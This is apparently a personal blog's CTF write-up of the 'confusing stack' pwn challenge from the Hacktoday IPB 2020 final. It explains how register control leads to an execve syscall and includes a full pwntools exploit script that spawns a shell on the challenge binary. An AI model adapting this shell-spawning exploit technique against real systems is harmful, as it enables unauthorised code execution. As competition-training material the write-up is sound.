---           
layout: post
title:  "Hacktoday IPB 2020 CTF final "
date:   2020-09-06 1
categories: ctf
description: Writeup Hacktoday IPB 2020 CTF final 
tags: ctf-writeup              
---

after a week, my team (glut0r) was qualified to compete in the final

<img src="/images/hacktoday2020-final/annouce.jpeg" />

## confusing stack

#### Solve:

Elf Information:

    ./confusing-stack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
    statically linked, stripped

Elf Protection:

    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

i assume this binary is written in assembly, 
so i open it in binary ninja

<img src="/images/hacktoday2020-final/asm.png" />

we can control some register including `%rbx`, `%rcx`, `%rdx` from  our first 
input.

<img src="/images/hacktoday2020-final/controll-reg.png" />

we can also control `%rax` from length of our second input. after doing some blackbox, 
i figure out that we can set `%rax` to 0xb to call `execve`(x86 syscall), and this is my exploit:

{% highlight python  %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/hacktoday2020-final/pwen/confussing-stack/confusing-stack/confusing-stack")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)
    int_0x80 = 0x4000f3
    segment = 0x600000
    p = p64(0x600000)
    p += p64(0) * 3
    p += p64(0x600000)
    p += p32(int_0x80)
    r.sendafter(":",p)
    r.sendafter(":","/bin/sh\x00".ljust(0xb,"\x00"))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("127.0.0.1", 1337)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

and we got a shell

<img src="/images/hacktoday2020-final/shell.png" />
